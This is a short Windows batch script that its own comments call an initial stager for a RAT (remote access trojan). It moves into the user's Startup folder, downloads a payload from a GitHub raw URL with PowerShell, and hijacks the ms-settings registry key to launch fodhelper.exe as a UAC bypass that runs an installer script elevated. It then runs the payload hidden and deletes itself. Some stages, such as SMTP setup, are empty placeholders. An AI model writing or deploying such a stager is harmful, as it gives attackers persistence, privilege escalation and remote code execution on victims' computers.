@echo off
@REM initial stager for rat

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup dir
cd %STARTUP%

@REM buil out stage two


@REM setup smtp


@REM write payloads to startup

powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile wget.cmd"

@rem powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/altnt.ps1 -OutFile altnt.ps1"
@rem powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer.ps1" -OutFile "installer.ps1"

REM Modify the registry to set the command to run with elevated privileges
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe /k powershell -ExecutionPolicy Bypass -Command \"& 'C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\installer.ps1'\"" /f
@rem powershell -windowstyle hidden -ExcutionPolicy Bypass ./installer.ps1

REM Run fodhelper.exe to trigger the elevated command
start fodhelper.exe


@REM run payload
powershell -windowstyle hidden -ExecutionPolicy Bypass ./wget.cmd

@REM cd back into initial location
cd "%INITIALPATH%"
pause
@REM self delete
del initial.cmd
